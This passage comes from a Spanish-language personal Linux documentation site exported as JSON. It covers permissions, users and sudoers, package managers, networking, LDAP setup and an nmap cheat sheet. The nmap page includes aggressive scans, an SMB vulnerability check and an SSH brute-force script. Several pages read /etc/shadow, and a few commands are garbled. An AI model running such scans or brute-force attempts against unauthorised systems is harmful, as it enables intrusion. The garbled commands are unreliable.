**Mostrará los permisos de un archivo.**\r\n\r\n  ```sh\r\n  ls -lh\r\n  ```\r\n\r\n- **cambiará el propietario de un determinado archivo.**\r\n\r\n  ```sh\r\n  chown Usuario1 Archivo1\r\n  ```\r\n\r\n- **cambiará el propietario de un determinado directorio y de todos los archivos y subdirectorios contenidos dentro.**\r\n\r\n  ```sh\r\n  chown -R Usuario1 directory1\r\n  ```\r\n\r\n- **convierte el archivo en invariable, por lo que no puede ser eliminado, alterado, renombrado, ni enlazado.**\r\n\r\n  ```sh\r\n  chattr +i Archivo1\r\n  ```\r\n\r\n- **permite que un archivo sea borrado de forma segura.**\r\n\r\n  ```sh\r\n  chattr +s Archivo1\r\n  ```\r\n\r\n- **mostrará los atributos especiales.**\r\n\r\n  ```sh\r\n  lsattr\r\n  ```\r\n\r\n### Usuarios y grupos\r\n\r\n- **quien eres tú**\r\n\r\n  ```sh\r\n  whoami\r\n  ```\r\n\r\n- **mostrará los usuarios presentes en el equipo.**\r\n\r\n  ```sh\r\n  cat /etc/passwd\r\n  cat /etc/shadow\r\n  ```\r\n\r\n- **mostrará los grupos presentes en el equipo**\r\n\r\n  ```sh\r\n  cat /etc/group\r\n  ```\r\n\r\n- **crear un nuevo grupo en el sistema.**\r\n\r\n  ```sh\r\n  groupadd nombre_del_grupo\r\n  ```\r\n\r\n- **borrará un grupo ya existente en el sistema.**\r\n\r\n  ```sh\r\n  groupdel nombre_del_grupo\r\n  ```\r\n\r\n- **renombrará un grupo ya existente.**\r\n\r\n  ```sh\r\n  groupmod -n nuevo_grupo viejo_grupo\r\n  ```\r\n\r\n- **Mostrar grupos de usuario**\r\n\r\n  ```sh\r\n  groups <usuario>\r\n  ```\r\n\r\n- **Creará un nuevo usuario perteneciente al grupo “admin”.**\r\n\r\n  ```sh\r\n  useradd -c “Nombre usuario” -g admin -d /home/nuevousuario -s /bin/bashnuevousuario\r\n  ```\r\n\r\n- **Agregar al usuario actual al grupo**\r\n\r\n  ```sh\r\n  usermod -aG docker $USER\r\n  ```\r\n\r\n- **Activar cambios en los grupos**\r\n\r\n  ```sh\r\n  newgrp docker\r\n  ```\r\n\r\n- **creará un nuevo usuario.**\r\n\r\n  ```sh\r\n  useradd Usuario1\r\n  ```\r\n\r\n- **borrará un usuario y su directorio Home.**\r\n\r\n  ```sh\r\n  userdel -r Usuario1\r\n  ```\r\n\r\n- **cambiará tu contraseña de usuario.**\r\n\r\n  ```sh\r\n  passwd\r\n  ```\r\n\r\n- **cambiará la contraseña del usuario indicado (solo permitido para el usuario root).**\r\n\r\n  ```sh\r\n  passwd Usuario1\r\n  ```\r\n\r\n- **establece una caducidad para la contraseña de un usuario determinado. En este caso expira el 31 de diciembre de 2019.**\r\n\r\n  ```sh\r\n  chage -E 2019-12-31 Usuario1\r\n  ```\r\n\r\n### Alias\r\n\r\n- **Para crear alias privados al usuaro se ha de modificar el archivo**\r\n\r\n  ```sh\r\n  sudo nano /home/<usuario>/.bashrc\r\n  ```\r\n\r\n- **Ejemplo para crear un alias**\r\n\r\n  ```sh\r\n  alias java8='source /home/rubenfgr/Scripts/java8.sh'\r\n  ```\r\n\r\n### Sudoers\r\n\r\n- **Agregar usuario al grupo sudoers**\r\n\r\n  ```sh\r\n  sudo nano /etc/sudoers\r\n  # Agregar al final la siguiente linea y guardar\r\n  <nombre-usuario> ALL=(ALL:ALL) ALL\r\n  ```\r\n\r\n  ```sh\r\n  sudo usermod -aG sudo <nombre-usuario>\r\n  ```\r\n\r\n## Repositorios y Paquetes\r\n\r\n- **Directorio de los repositorios**\r\n\r\n  ```sh\r\n  cd /etc/apt/\r\n  # Fichero de los repos oficiales\r\n  cd /etc/apt/sources.list\r\n  ```\r\n\r\n### .DEB\r\n\r\nDebian, Ubuntu, Mint y distribuciones derivadas.\r\n\r\n- **instalará o actualizará un paquete deb.**\r\n\r\n  ```sh\r\n  dpkg -i paquete.deb\r\n  ```\r\n\r\n- **eliminará un determinado paquete deb del sistema.**\r\n\r\n  ```sh\r\n  dpkg -r paquete\r\n  ```\r\n\r\n- **mostrará todos los paquetes deb instalados en el sistema.**\r\n\r\n  ```sh\r\n  dpkg -l\r\n  ```\r\n\r\n- **mostrará información del paquete indicado instalado en el sistema.**\r\n\r\n  ```sh\r\n  dpkg -s paquete\r\n  ```\r\n\r\n### Gestor de paquetes APT\r\n\r\n- **Agregar claves públicas de servidores al APT**\r\n\r\n  ```sh\r\n  sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys KEYS_HERE\r\n  ```\r\n\r\n- **instalará o actualizará un determinado paquete deb.**\r\n\r\n  ```sh\r\n  apt-get install paquete\r\n  ```\r\n\r\n- **instalará o actualizará un paquete deb desde un cdrom.**\r\n\r\n  ```sh\r\n  apt-cdrom install paquete\r\n  ```\r\n\r\n- **actualizará la lista de paquetes instalados.**\r\n\r\n  ```sh\r\n  apt-get update\r\n  ```\r\n\r\n- **actualizará todos los paquetes instalados.**\r\n\r\n  ```sh\r\n  apt-get upgrade\r\n  ```\r\n\r\n- **eliminará el paquete deb indicado del sistema.**\r\n\r\n  ```sh\r\n  apt-get remove paquete\r\n  ```\r\n\r\n- **verificará la correcta resolución de las dependencias.**\r\n\r\n  ```sh\r\n  apt-get check\r\n  ```\r\n\r\n- **limpiará la cache desde los paquetes descargados.**\r\n\r\n  ```sh\r\n  apt-get clean\r\n  ```\r\n\r\n- **Buscar un paquete**\r\n\r\n  ```sh\r\n  apt-cache show <paquete>\r\n  ```\r\n\r\n### .RPM\r\n\r\nRed Hat, Fedora, SUSE Linux,etc.\r\n\r\n- **instalará un paquete rpm.**\r\n\r\n  ```sh\r\n  rpm -ivh paquete.rpm\r\n  ```\r\n\r\n- **instalará un paquete rpm ignorando las peticiones de dependencias.**\r\n\r\n  ```sh\r\n  rpm -ivh –nodeeps paquete.rpm\r\n  ```\r\n\r\n- **actualizará un paquete rpm sin cambiar la configuración de los ficheros.**\r\n\r\n  ```sh\r\n  rpm -U paquete.rpm\r\n  ```\r\n\r\n- **actualizará un determinado paquete rpm solamente si este está instalado.**\r\n\r\n  ```sh\r\n  rpm -F paquete.rpm\r\n  ```\r\n\r\n- **eliminará el paquete rpm indicado.**\r\n\r\n  ```sh\r\n  rpm -e paquete.rpm\r\n  ```\r\n\r\n- **mostrará todos los paquetes rpm instalados en el sistema.**\r\n\r\n  ```sh\r\n  rpm -qa\r\n  ```\r\n\r\n- **ofrece la información en un paquete específico instalado.**\r\n\r\n  ```sh\r\n  rpm -qi paquete\r\n  ```\r\n\r\n- **mostrará el historial de revisiones de un paquete rpm.**\r\n\r\n  ```sh\r\n  rpm -q paquete –changelog\r\n  ```\r\n\r\n- **verificará la integridad de un paquete rpm.**\r\n\r\n  ```sh\r\n  rpm –checksig paquete.rpm\r\n  ```\r\n\r\n- **verificará la integridad de todos los paquetes rpm instalados**\r\n\r\n  ```sh\r\n  rpm -qa gpg-pubkey\r\n  ```\r\n\r\n### Gestor de paquetes YUM\r\n\r\nRed Hat, Fedora y similares\r\n\r\n- **descargará e instalará un determinado paquete rpm.**\r\n\r\n  ```sh\r\n  yum install paquete\r\n  ```\r\n\r\n- **instalará un paquete rpm y tratará de resolver todas las dependencias usando tus repositorios.**\r\n\r\n  ```sh\r\n  yum localinstall paquete.rpm\r\n  ```\r\n\r\n- **actualizará todos los paquetes rpm instalados en el sistema.**\r\n\r\n  ```sh\r\n  yum update paquete.rpm\r\n  ```\r\n\r\n- **actualizará un determinado paquete rpm.**\r\n\r\n  ```sh\r\n  yum update paquete\r\n  ```\r\n\r\n- **eliminará el paquete rpm especificado.**\r\n\r\n  ```sh\r\n  yum remove paquete\r\n  ```\r\n\r\n- **listará todos los paquetes de software instalados en el sistema.**\r\n\r\n  ```sh\r\n  yum list\r\n  ```\r\n\r\n- **encontrará un paquete en repositorio rpm.**\r\n\r\n  ```sh\r\n  yum search paquete\r\n  ```\r\n\r\n## Redes\r\n\r\n- **Comprobar que un servicio en segun plano (daemon) esta escuchando**\r\n\r\n  ```sh\r\n  netstat -lntp | grep <nombre-servicio>\r\n  ```\r\n\r\n- **Comprobar puertos a las escucha**\r\n\r\n  ```sh\r\n  # Todos\r\n  ss -lntp\r\n  # Uno en concreto\r\n  ss -lntp | grep 1080\r\n  # netstat\r\n  netstat -putane | grep <filtro>\r\n  sudo lsof -i:80\r\n  sudo fuser -k 80/tcp\r\n  ```\r\n\r\n### IPTABLES\r\n\r\n- **Redireccionar puerto a IP + PUERTO de destino**\r\n\r\n  ```sh\r\n  sudo iptables -t nat -A PREROUTING -i eth1 -p tcp --dport 80 -j DNAT --to-destination 192.168.2.80\r\n  ```\r\n\r\n- **Persistir la configuración**\r\n\r\n  ```sh\r\n  # Instalar iptables-persistant\r\n  sudo apt install iptables-persistant\r\n  # Guardar la configuración\r\n  sudo iptables-save\r\n  ```\r\n\r\n### Resolutores de host DNS e IP\r\n\r\n```sh\r\ndig blog.rubenfgr.com # De DNS a IP\r\ndig -x blog.rubenfgr.com # De IP a DNS\r\nhost blog.rubenfgr.com # Indistinto\r\nnslookup blog.rubenfgr.com # Indistinto\r\n```\r\n\r\n### Reiniciar cache DNS\r\n\r\n```sh\r\n# Cliente\r\n/etc/init.d/nscd restart\r\n# Servidor\r\n/usr/sbin/rndc flush\r\n```\r\n",
    "path": "/systems/linux/reference"
  },
  {
    "id": 73,
    "title": "0enlaces",
    "content": "\r\n- Bash Snippets\r\n  [https://github.com/alexanderepstein/Bash-Snippets](https://github.com/alexanderepstein/Bash-Snippets)",
    "path": "/systems/linux/tools/0enlaces"
  },
  {
    "id": 74,
    "title": "alsa",
    "content": "\r\n**ALSA** - Advanced Linux Sound Architecture es un componente del núcleo Linux destinado a sustituir a Open Sound System, licenciado bajo GNU General Public License\r\n\r\n- **Forzar la recarga de Alsa**\r\n\r\n  ```sh\r\n  sudo alsa force-reload\r\n  sudo reboot\r\n  ```\r\n\r\n- **Reinstalar el audio Alsa y Pulse**\r\n\r\n  ```sh\r\n  sudo apt-get eliminar alsa-base pulseaudio\r\n  sudo apt-get instalar alsa-base pulseaudio\r\n  sudo alsa force-reload\r\n  sudo reboot\r\n  ```\r\n\r\n- **Cambiar el nombre del directorio de configuración de pulse para que el solo vuelva a generar**\r\n\r\n  ```sh\r\n  mv ~/.config/pulse ~/.config/old_pulse\r\n  sudo reboot\r\n  ```\r\n\r\n- **Probar con alsamixer y comprobar que no este nada muteado**\r\n\r\n  ```sh\r\n  alsamixer\r\n  ```\r\n\r\n- **Guardar la configuración de alsamixer**\r\n\r\n  ```sh\r\n  sudo alsactl store\r\n  ```\r\n\r\n- **Editar el archivo despachador de voz con:**\r\n\r\n  Cambiar RUN=yes por RUN=no\r\n\r\n  ```sh\r\n  sudo reboot\r\n  ```\r\n",
    "path": "/systems/linux/tools/alsa"
  },
  {
    "id": 75,
    "title": "alternatives",
    "content": "\r\nPermite cambiar entre versiones de aplicaciones\r\n\r\n- **Opciones**\r\n\r\n```sh\r\nalternatives [options] --remove name path\r\n\r\nalternatives [options] --set name path\r\n\r\nalternatives [options] --auto name\r\n\r\nalternatives [options] --display name\r\n\r\nalternatives [options] --config name\r\n```\r\n\r\n- **Ejemplos con versiones de Java**\r\n\r\n```sh\r\nupdate-alternatives --install /usr/bin/java java /usr/lib/jvm/<java-version>/bin/java\r\nupdate-alternatives --install /usr/bin/java java /usr/lib/jvm/<java-version-2>/bin/java\r\n\r\nupdate-alternatives --config java\r\n```\r\n\r\n> En este momento se puede seleccionar la versión de java deseada a través de su ID\r\n",
    "path": "/systems/linux/tools/alternatives"
  },
  {
    "id": 76,
    "title": "colores",
    "content": "\r\n## Lista de códigos de colores\r\n\r\n| Color             | Código |\r\n| ----------------- | ------ |\r\n| Negro             | 0;30   |\r\n| Gris oscuro       | 1;30   |\r\n| Azul              | 0;34   |\r\n| Azul resaltado    | 1;34   |\r\n| Verde             | 0;32   |\r\n| Verde resaltado   | 1;32   |\r\n| Cian              | 0;36   |\r\n| Cyan resaltado    | 1;36   |\r\n| Rojo              | 0;31   |\r\n| Rojo resaltado    | 1;31   |\r\n| Púrpura           | 0;35   |\r\n| Púrpura resaltado | 1;35   |\r\n| Café              | 0;33   |\r\n| Amarillo          | 1;33   |\r\n| Gris              | 0;37   |\r\n| Blanco            | 1;37   |\r\n\r\n## Ejemplos\r\n\r\n```sh\r\necho -e ‘Esto es \\e[0;31mrojo\\e[0m y esto es \\e[1;34mazul resaltado\\e[0m’\r\necho -e ‘Así se escribe \\e[1;34mG\\e[0m\\e[1;31mo\\e[0m\\e[1;33mo\\e[0m\\e[1;34mg\\e[0m\\e[1;32ml\\e[0m\\e[1;31me\\e[0m’\r\n```\r\n",
    "path": "/systems/linux/tools/colores"
  },
  {
    "id": 77,
    "title": "Instalación",
    "content": "\r\n> Ubuntu 20.04\r\n\r\n## Instalación y configuración\r\n\r\n```sh\r\n# Instalación\r\nsudo apt update & upgrade\r\nsudo apt install slapd ldap-utils\r\n# Configuración\r\nsudo dpkg-reconfigure slapd\r\n# ¿Desea omitir la configuración del servidor OpenLDAP? No\r\n# Introduzca su nombre de dominio DNS: proyecto-empresa.local\r\n# Nombre de la organización: proyecto-empresa.local\r\n# Contraseña del administrador: admin\r\n# Verificación de la contraseña: admin\r\n# Motor de base de datos a utilizar: HDB\r\n# ¿Desea que se borre la base de datos cuando se purgue el paquete slapd? No\r\n# ¿Desea mover la base de datos antigua? Sí\r\n# ¿Desea permitir el protocolo LDAPv2? Sí\r\n```\r\n\r\n## Ejecución, recarga, parada, estado.\r\n\r\n```sh\r\nsudo service slapd start # stop|reload|status|force-reload\r\n```\r\n\r\n## Administración\r\n\r\nLos siguientes ficheros se pueden juntan en un único fichero con orden de preferencia para evitar fallos relacionales\r\n\r\n- **Crear estructura (si se ha generado con el comando dpkg-reconfigure slapd no es necesario)**\r\n\r\n```sh\r\n# Crear un fichero .ldif y agregar\r\n# Objetos raiz del dominio\r\ndn: dc=dominioempresa-dw4,dc=local\r\nobjectClass: top\r\nobjectClass: dcObject\r\nobjectclass: organization\r\no: dominioempresa-dw4.local\r\ndc: dominioempresa-dw4\r\ndescription:  Raiz de dominio\r\n```\r\n\r\n- **Crear unidades organizacionales**\r\n\r\n```sh\r\n# crear un fichero .ldif y agregar\r\n# Unidad organizacional \"grupo\"\r\ndn: ou=grupo,dc=dominioempresa-dw4,dc=local\r\nobjectClass: organizationalUnit\r\nou: grupo\r\n```\r\n\r\n- **Crear grupos**\r\n\r\n```sh\r\n# crear un fichero .ldif y agregar\r\n# Grupo \"users\"\r\ndn: cn=users,ou=grupo,dc=dominioempresa-dw4,dc=local\r\nobjectClass: top\r\nobjectClass: posixGroup\r\ngidNumber: 2000\r\ncn: users\r\n```\r\n\r\n- **Crear usuarios**\r\n\r\n```sh\r\n# crear un fichero .ldif y agregar\r\n# Usuario \"usuarioTest\"\r\n# Mi Usuario\r\ndn: uid=usuarioTest,cn=users,ou=grupo,dc=dominioempresa-dw4,dc=local\r\nobjectClass: inetOrgPerson\r\nobjectClass: posixAccount\r\ncn: usuarioTest\r\nsn: gr\r\nloginShell: /bin/bash\r\nuidNumber: 10001\r\ngidNumber: 10001\r\nhomeDirectory: /home/usuarioTest\r\ngecos: usuarioTest\r\nuserPassword: 123456\r\nmail: usuarioTest@dominioempresa-dw4.local\r\n```\r\n",
    "path": "/systems/linux/tools/ldap"
  },
  {
    "id": 78,
    "title": "nmap",
    "content": "\r\n- **Barrido de ping**\r\n\r\n  ```sh\r\n  nmap -sP 192.168.0.*\r\n  nmap -sn 192.168.0.*\r\n  ```\r\n\r\n- **Escaneo de puertos**\r\n\r\n  ```sh\r\n  nmap -p 80, 21 192.168.0.*\r\n  nmap -p 21-80 ejemplo.com\r\n  nmap -p 21-23, 1000-2000 192.168.1.1-14\r\n  ```\r\n\r\n- **Escaneo ARP**\r\n\r\n  ```sh\r\n  nmap -sP -PR 192.168.*.*\r\n  namp -sn --disable-arp-ping 192.168.0.*\r\n  ```\r\n\r\n- **Sondeo más agresivo**\r\n\r\n  > NULL (-sN), FIN (-sF) y Xmas (-sX)\r\n  > -T paranoid o 0, sneaky o 1, polite o 2, normal o 3, agressive o 4 e insane o 5\r\n  > -T4 recomendado para red local\r\n\r\n  - NULL\r\n\r\n  ```sh\r\n  nmap -v -sN -p 8080 server1.ejemplo.com\r\n  nmap -sN -T5 192.168.1.4\r\n  ```\r\n\r\n  - FIN\r\n\r\n  ```sh\r\n  nmap -sF -T4 192.168.1.4-8\r\n  nmap -sF -T2 192.168.1.6\r\n  ```\r\n\r\n  - Xmas\r\n\r\n  ```sh\r\n  nmap -sX -T2 -v2 -p 80 192.168.1.4\r\n  ```\r\n\r\n- **Scripts**\r\n\r\n  - auth: ejecuta todos sus scripts disponibles para autenticación\r\n  - default: ejecuta los scripts básicos por defecto de la herramienta\r\n  - discovery: recupera información del target o víctima\r\n  - external: script para utilizar recursos externos\r\n  - intrusive: utiliza scripts que son considerados intrusivos para la víctima o target\r\n  - malware: revisa si hay conexiones abiertas por códigos maliciosos o backdoors (puertas traseras)\r\n  - safe: ejecuta scripts que no son intrusivos\r\n  - vuln: descubre las vulnerabilidades más conocidas\r\n  - all: ejecuta absolutamente todos los scripts con extensión NSE disponibles\r\n\r\n  ```sh\r\n  nmap -f -sS -sV --script auth 192.168.4.4\r\n  ```\r\n\r\n- **Descubrir vulnerabilidades**\r\n\r\n  ```sh\r\n  # SMB ms08-067\r\n  nmap -p 445 --script smb-vuln-ms08-067 192.168.4.*\r\n  # SSH fuerza bruta\r\n  nmap --script ssh-brute.nse 192.168.41.14\r\n  ```\r\n",
    "path": "/systems/linux/tools/nmap"
  },
  {
    "id": 79,
    "title": "tar-gz-zip",
    "content": "\r\n- **Archivos .tar.gz**\r\n\r\n  ```sh\r\n  # Comprimir:\r\n  tar -czvf empaquetado.tar.gz /carpeta/a/empaquetar/\r\n  # Descomprimir:\r\n  tar -xzvf archivo.tar.gz\r\n  ```\r\n\r\n- **Archivos .tar**\r\n\r\n  ```sh\r\n  # Empaquetar:\r\n  tar -cvf paquete.tar /dir/a/comprimir/\r\n  # Desempaquetar:\r\n  tar -xvf paquete.tar\r\n  ```\r\n\r\n- **Archivos .gz**\r\n\r\n  ```sh\r\n  # Comprimir:\r\n  gzip -9 index.php\r\n  # Descomprimir:\r\n  gzip -d index.php.gz\r\n  ```\r\n\r\n- **Archivos .zip**\r\n\r\n  ```sh\r\n  # Comprimir:\r\n  zip archivo.zip carpeta\r\n  # Descomprimir:\r\n  unzip archivo.zip\r\n  ```\r\n",
    "path": "/systems/linux/tools/tar-gz-zip"
  },
  {
    "id": 80,
    "title": "vim",
    "content": "\r\n## Atajos\r\n\r\n```sh\r\nI o Insert --> Modo edición INSERT\r\nESC --> Salir del modo actual\r\nV --> Selecciona la linea actual y entra en el modo VISUAL\r\nY --> Copia la selección\r\nP --> Pegar selección\r\nX --> Corta la selección\r\n:w --> Guarda lo que estamos haciendo\r\n:q --> Salir\r\n:qa --> Guardar y salirç\r\n:e + \"ruta\" --> abre el archivo indicado\r\n:split --> divide la pantalla verticalmente o horizontalmente para editar varios archivos a la vez\r\n:Ex Explorador de archivos\r\n:help Ayuda de Vim\r\n\r\n:e ~/.vimrc Editar el archivo de configuración de vim\r\n```",
    "path": "/systems/linux/tools/vim"
  },
  {
    "id": 81,
    "title": "Herramientas",
    "content": "\r\n# Herramientas\r\n\r\n## Análisis forense\r\n\r\n- [Autopsy](https://www.sleuthkit.org/autopsy/)\r\n",
    "path": "/systems/linux/tools"
  },
  {
    "id": 82,
    "title": "Usuarios y permisos",
    "content": "\r\n# Usuarios y permisos\r\n\r\n## passwd, shadow, group\r\n\r\nLos usuarios y grupos de un sistema Linux se gestionan a través de los archivos `/etc/passwd`, `/etc/shadow` y `/etc/group`.\r\n\r\nCon el comando **id** se puede obtener información sobre el usuario actual:\r\n\r\n- UID: Identificador de usuario\r\n- GID: Identificador de grupo\r\n- Grupos: Grupos a los que pertenece el usuario\r\n\r\n```sh\r\nid\r\n```\r\n\r\n### /etc/passwd\r\n\r\nEl archivo `/etc/passwd` contiene información sobre los usuarios del sistema. Cada línea del archivo representa un usuario y contiene los siguientes campos separados por dos puntos `:`:\r\n\r\n1. Nombre de usuario\r\n2. Contraseña (se utiliza `x` para indicar que la contraseña está en el archivo `/etc/shadow`)\r\n3. UID (User ID)\r\n4. GID (Group ID)\r\n5. Nombre completo del usuario\r\n6. Directorio de inicio\r\n7. Intérprete de comandos\r\n\r\n```sh\r\ncat /etc/passwd\r\n```\r\n\r\n### /etc/shadow\r\n\r\nEl archivo `/etc/shadow` contiene información sobre las contraseñas de los usuarios del sistema. Cada línea del archivo representa un usuario y contiene los siguientes campos separados por dos puntos `:`:\r\n\r\n1. Nombre de usuario\r\n2. Contraseña cifrada\r\n3. Fecha de último cambio de contraseña\r\n4. Días mínimos entre cambios de contraseña\r\n5. Días máximos entre cambios de contraseña\r\n6. Días de advertencia antes de que la contraseña caduque\r\n7. Días de inactividad antes de que la cuenta se bloquee\r\n8. Fecha de caducidad de la cuenta\r\n9. Cuenta bloqueada\r\n\r\n```sh\r\ncat /etc/shadow\r\n```\r\n\r\n### /etc/group\r\n\r\nEl archivo `/etc/group` contiene información sobre los grupos del sistema. Cada línea del archivo representa un grupo y contiene los siguientes campos separados por dos puntos `:`:\r\n\r\n1. Nombre de grupo\r\n2. Contraseña (se utiliza `x` para indicar que la contraseña está en el archivo `/etc/gshadow`)\r\n3. GID (Group ID)\r\n4. Lista de usuarios que pertenecen al grupo\r\n\r\n```sh\r\ncat /etc/group\r\n```\r\n\r\n## Lectura (r), Escritura (w) y Ejecución (x)\r\n\r\nLos permisos de un archivo o directorio se dividen en tres categorías: propietario, grupo y otros. Cada categoría tiene tres permisos: lectura (r), escritura (w) y ejecución (x).\r\n\r\n<u>Existen 3 grupos de permisos:</u>\r\n\r\n- **Propietario**: Permisos del usuario propietario del archivo o directorio.\r\n- **Grupo**: Permisos del grupo al que pertenece el archivo o directorio.\r\n- **Otros**: Permisos para el resto de usuarios.\r\n\r\n### Permisos de archivos\r\n\r\n- `-`: Sin permisos\r\n- `r`: Lectura. Permite ver el contenido del archivo.\r\n- `w`: Escritura. Permite modificar el contenido del archivo.\r\n- `x`: Ejecución. Permite ejecutar el archivo si es un script o programa.\r\n\r\n### Permisos de directorios\r\n\r\n- `-`: Sin permisos\r\n- `r`: Lectura. Permite ver el contenido del directorio.\r\n- `w`: Escritura. Permite modificar el contenido del directorio (crear, borrar archivos).\r\n- `x`: Ejecución. Permite acceder al contenido del directorio.\r\n\r\n:::note\r\nTener permiso de lectura o escritura en un directorio sin permiso de ejecución no es útil. Tener permiso de ejecución pero no de lectura es ocasionalmente útil: permite acceder a los archivos sólo si se conoce su nombre exacto, un mecanismo muy rudimentario de protección.\r\n:::\r\n\r\n```sh\r\n# Permisos de un archivo\r\nls -l archivo\r\n```\r\n## Usuario ROOT\r\n\r\nEl usuario **root** es el superusuario del sistema Linux y tiene todos los permisos. Se identifica con el UID 0 y puede realizar cualquier operación en el sistema.\r\n\r\nPara cambiar al usuario root se utiliza el comando **su** (substitute user) o **sudo** (superuser do).\r\n\r\n```sh\r\n# Cambiar al usuario root\r\nsu\r\n# Cambiar al usuario root con sudo\r\nsudo su\r\n```\r\n\r\n:::warning\r\nEl usuario root tiene acceso total al sistema y puede realizar cambios que afecten al funcionamiento del sistema. Se recomienda utilizar el usuario root con precaución.\r\nUn administrador de sistemas debe utilizar el usuario root sólo cuando sea necesario y preferiblemente utilizar sudo para ejecutar comandos con privilegios de superusuario.\r\n:::\r\n\r\n## Cambiar permisos en octal\r\n\r\nLos permisos de un archivo o directorio se pueden cambiar utilizando el comando **chmod** (change mode) seguido de un número octal que representa los permisos.\r\n\r\n- **4**: Lectura (r)\r\n- **2**: Escritura (w)\r\n- **1**: Ejecución (x)\r\n\r\nLa suma de los números representa los permisos de la siguiente forma:\r\n\r\n- **0**: Sin permisos\r\n- **1**: Ejecución\r\n- **2**: Escritura\r\n- **3**: Escritura y ejecución\r\n- **4**: Lectura\r\n- **5**: Lectura y ejecución\r\n- **6**: Lectura y escritura\r\n- **7**: Lectura, escritura y ejecución\r\n\r\n```sh\r\n# Cambiar permisos de un archivo a 644\r\nchmod 644 archivo\r\n# Cambiar permisos de un directorio a 755\r\nchmod 755 directorio\r\n```\r\n\r\n## Cambiar permisos con símbolos\r\n\r\nLos permisos de un archivo o directorio se pueden cambiar utilizando el comando **chmod** seguido de los símbolos `+` (añadir) o `-` (quitar) y los permisos a modificar.\r\n\r\n- **u**: Propietario\r\n- **g**: Grupo\r\n- **o**: Otros\r\n- **a**: Todos\r\n\r\n- **r**: Lectura\r\n- **w**: Escritura\r\n- **x**: Ejecución\r\n\r\n```sh\r\n# Añadir permiso de escritura al grupo\r\nchmod g+w archivo\r\n# Quitar permiso de ejecución a otros\r\nchmod o-x archivo\r\n```\r\n\r\n## Permisos por defecto: umask\r\n\r\nEl comando **umask** (user file creation mask) establece los permisos por defecto para los archivos y directorios creados por un usuario.\r\n\r\nEl valor de umask se resta a los permisos máximos (777 para directorios y 666 para archivos) para obtener los permisos reales.\r\n\r\n```sh\r\n# Ver el valor de umask\r\numask\r\n# Establecer umask a 022\r\numask 022\r\n```\r\n\r\n## Setuid, Setgid y Sticky Bit\r\n\r\n- **Setuid (s)**: Permite que un archivo se ejecute con los permisos del propietario.\r\n- **Setgid (s)**: Permite que un archivo se ejecute con los permisos del grupo.\r\n- **Sticky Bit (t)**: Permite que sólo el propietario pueda borrar o mover archivos en un directorio.\r\n\r\nEn la notación octal, el setuid se representa con el bit **4**, el setgid con el bit **2** y el sticky bit con el bit **1**.\r\n\r\n```sh\r\n# Establecer setuid en un archivo\r\nchmod u+s archivo\r\n# Establecer setgid en un archivo\r\nchmod g+s archivo\r\n# Establecer sticky bit en un directorio\r\nchmod +t directorio\r\n```\r\n\r\n## Cambio de identidad: su\r\n\r\nEl comando **su** (substitute user) permite cambiar de usuario en un terminal. Si se ejecuta sin argumentos, cambia al usuario root.\r\n\r\n```sh\r\n# Crear un nuevo usuario\r\nsudo adduser usuario\r\n# Cambiar al usuario root\r\nsu\r\n# Cambiar a otro usuario\r\nsu usuario\r\n# Cambiar a otro usuario moviendo el directorio de trabajo\r\nsu - usuario\r\n```\r\n\r\n### Ejecutar comandos en nombre de otro usuario\r\n\r\nPara ejecutar un comando en nombre de otro usuario se puede utilizar el comando **su** o **sudo**.\r\n\r\n```sh\r\n# Ejecutar un comando en nombre de otro usuario\r\nsu -c \"comando\" usuario\r\n# Ejecutar un comando en nombre de otro usuario con sudo\r\nsudo -u usuario comando\r\n```\r\n\r\n## sudo\r\n\r\nEl comando **sudo** (superuser do) permite ejecutar comandos con privilegios de superusuario. Para utilizar sudo es necesario añadir el usuario al grupo sudo.\r\n\r\n```sh\r\n# Añadir un usuario al grupo sudo\r\nsudo usermod -aG sudo usuario\r\n# Ejecutar un comando con sudo\r\nsudo comando\r\n# Shell interactiva con sudo\r\nsudo -i\r\n```\r\n\r\n## sudoers\r\n\r\nEl archivo `/etc/sudoers` contiene la configuración de sudo y permite definir qué usuarios pueden ejecutar comandos con sudo y qué comandos pueden ejecutar.\r\n\r\nPara editar el archivo sudoers se utiliza el comando **visudo**.\r\n\r\n```sh\r\n# Editar el archivo sudoers\r\nsudo visudo\r\n```\r\n\r\n### Privilegios por defecto\r\n\r\n- root ALL=(ALL:ALL) ALL: Permite a root ejecutar cualquier comando en cualquier host.\r\n- %admin ALL=(ALL:ALL) ALL: Permite a los miembros del grupo admin ejecutar cualquier comando en cualquier host.\r\n- %sudo ALL=(ALL:ALL) ALL: Permite a los miembros del grupo sudo ejecutar cualquier comando en cualquier host.\r\n\r\n### Desglose de la configuración\r\n\r\n- **root**: Usuario o grupo al que se aplican los privilegios.\r\n- **ALL**: Host al que se aplican los privilegios. Puede ser un nombre de host o ALL para todos los hosts.\r\n- **(ALL:ALL)**: Usuario y grupo al que se cambia al ejecutar el comando.\r\n- **ALL**: Comando que se puede ejecutar.\r\n\r\n### Ejemplos\r\n\r\n- `usuario ALL=(ALL:ALL) ALL`: Permite a un usuario ejecutar cualquier comando en cualquier host.\r\n- `%grupo ALL=(ALL:ALL) ALL`: Permite a los miembros de un grupo ejecutar cualquier comando en cualquier host.\r\n- `usuario ALL=(ALL) /bin/ls`: Permite a un usuario ejecutar el comando `/bin/ls` en cualquier host.\r\n- `usuario ALL=(ALL) NOPASSWD: /bin/ls`: Permite a un usuario ejecutar el comando `/bin/ls` en cualquier host sin contraseña.\r\n- `usuario ALL=(ALL) /bin/ls, /bin/cat`: Permite a un usuario ejecutar los comandos `/bin/ls` y `/bin/cat` en cualquier host.\r\n- `usuario ALL=(ALL) /bin/*`: Permite a un usuario ejecutar todos los comandos en `/bin` en cualquier host.\r\n- `usuario ALL=(ALL) /bin/*, !/bin/sh`: Permite a un usuario ejecutar todos los comandos en `/bin` excepto `/bin/sh` en cualquier host.\r\n- `usuario ALL=(ALL) /bin/*, !/bin/sh, !/bin/su`: Permite a un usuario ejecutar todos los comandos en `/bin` excepto `/bin/sh` y `/bin/su` en cualquier host.\r\n\r\n## Gestión de Usuarios y Grupos\r\n\r\n### Añadir un nuevo usuario\r\n\r\nPara añadir un nuevo usuario se utiliza el comando **adduser**.\r\n\r\n```sh\r\n# Añadir un nuevo usuario\r\nsudo adduser usuario\r\n# Avanzado\r\nsudo adduser --home /home/usuario --shell /bin/bash usuario\r\n```\r\n\r\n### Añadir un nuevo grupo\r\n\r\nPara añadir un nuevo grupo se utiliza el comando **groupadd**.\r\n\r\n```sh\r\n# Añadir un nuevo grupo\r\nsudo addgroup grupo\r\n# Avanzado\r\nsudo groupadd --gid 